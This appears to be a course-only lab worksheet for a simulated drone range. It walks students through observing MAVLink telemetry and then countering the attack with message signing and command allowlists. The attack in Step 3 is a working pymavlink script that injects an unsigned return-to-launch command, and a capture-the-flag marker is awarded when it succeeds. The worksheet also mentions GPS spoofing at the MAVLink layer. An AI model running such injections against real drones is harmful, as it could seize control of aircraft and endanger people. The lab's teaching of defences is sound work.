# Drone MAVLink hijack worksheet

Status: **proposed course-only lab worksheet**. This is a synthetic exercise for
an isolated range session. It does not use a real aircraft, radio transmitter,
or live airspace.

## Deployment model

Run this on the **centralized range server**, not on student laptops. The
platform already allocates one `/24` per session and starts a Compose stack for
the learner. A student laptop is only suitable for an offline single-user SITL
demo.

The first lab uses a lightweight stack:

```text
attacker (Kali tools, pymavlink)
        |
        |  virtual MAVLink UDP
        v
SITL flight controller (ArduPilot or PX4, headless)
        |
        v
ground station (MAVProxy or QGroundControl)
```

Do **not** start with Gazebo, ROS 2, or GNU Radio. They are heavy, need more CPU
and memory, and are not required to teach the command-trust failure. Add them
only as advanced or course-only modules.

## Safety and scope

- No real drone, no RF transmission, no GPS jamming, no spectrum use.
- No live airspace, airport, or ISED/FCC-regulated operation.
- Use synthetic telemetry and a simulated flight controller.
- Rate-limit command injection and fuzzing.
- The worksheet is a lab exercise, not a field procedure.

## Before you begin

- [ ] Lab session is running and the SITL service is healthy.
- [ ] The ground station shows a heartbeat and a simulated position.
- [ ] The attacker container can reach the SITL service by name.
- [ ] You have `pymavlink` and `MAVProxy` available.

## Step 1: Confirm the telemetry link

```bash
python - <<'PY'
from pymavlink import mavutil

master = mavutil.mavlink_connection("udp:sitl:14550")
master.wait_heartbeat(timeout=20)
print("system", master.target_system, "component", master.target_component)
print("mode", master.flightmode)
PY
```

Record the system ID, component ID, firmware, and flight mode. A heartbeat is
not proof that the link is authenticated.

## Step 2: Observe a legitimate mode change

Use the ground station to switch from `GUIDED` to `LOITER` or `ALT_HOLD`.
Capture the heartbeat and `STATUSTEXT` messages:

```bash
python - <<'PY'
from pymavlink import mavutil

master = mavutil.mavlink_connection("udp:sitl:14550")
master.wait_heartbeat(timeout=20)
for _ in range(10):
    message = master.recv_match(blocking=True, timeout=5)
    if message:
        print(message.get_type(), message.to_dict())
PY
```

Record the message type, source system/component, and timestamp.

## Step 3: Inject a command

Send a return-to-launch command from the attacker node. The lab simulator
accepts unsigned MAVLink, which is the defect under test.

```bash
python - <<'PY'
from pymavlink import mavutil

master = mavutil.mavlink_connection("udp:sitl:14550")
master.wait_heartbeat(timeout=20)
master.mav.command_long_send(
    master.target_system,
    master.target_component,
    mavutil.mavlink.MAV_CMD_NAV_RETURN_TO_LAUNCH,
    0,
    0, 0, 0, 0, 0, 0, 0,
)
print("sent RTL")
PY
```

Observe the simulated flight mode and the ground-station alert. The lab
dashboard returns the completion marker (`<flag>`) when the simulated aircraft
accepts the injected command.

## Step 4: Repeat with a signed link

The lab provides a MAVLink 2 signing key through the session secret. Restart
SITL and the ground station with signing enabled, then repeat Step 3 without the
key. The command must be rejected. Repeat with the correct key and confirm it is
accepted.

Record:

- whether the unsigned command was accepted;
- whether the signed command was accepted;
- whether the ground station logged the rejection;
- whether the flight mode changed.

## Step 5: Add a command allowlist

Configure the simulator or gateway to allow only the commands the mission
needs. Re-run the attack and confirm that RTL and arm/disarm are rejected while
the allowed commands still work.

## Evidence table

| Field | Your answer |
|---|---|
| SITL system/component IDs | |
| Firmware and mode before the attack | |
| Command sent | |
| Mode after the unsigned command | |
| Signing enabled? | |
| Unsigned command result | |
| Signed command result | |
| Allowlist result | |
| Marker / flag | |
| First control you would add | |
| Detection you would deploy | |

## Remediation

- Enable MAVLink 2 signing and reject unsigned command messages.
- Use a per-session or per-vehicle key; rotate it and keep it out of logs.
- Allowlist the commands the mission actually needs.
- Require operator confirmation for arm/disarm, mode changes, and mission
  uploads.
- Segment the ground station, companion computer, and attacker-facing network.
- Log source system/component, command, mode change, and signing result.
- Add geofence and failsafe behavior; test it in SITL before flight.

## Advanced modules

| Module | Add | Keep out of the default lab |
|---|---|---|
| GPS spoofing | inject `GPS_INPUT`/`HIL_GPS` at the MAVLink layer and observe EKF failsafe | no RF, no real GNSS simulator |
| Gazebo/ROS 2 | 3D physics, camera, VIO, swarm | CPU/GPU heavy; course-only |
| GNU Radio/ZeroMQ | synthetic IQ, FHSS, jamming detection | no transmit, no SDR hardware |
| Damn Vulnerable Drone | structured companion-computer and camera scenarios | verify image licence, size, and privileges first |

## Publication rule

This worksheet uses no real addresses, hostnames, lab flags, or credentials.
Follow [`PUBLICATION-METADATA-POLICY.md`](PUBLICATION-METADATA-POLICY.md).
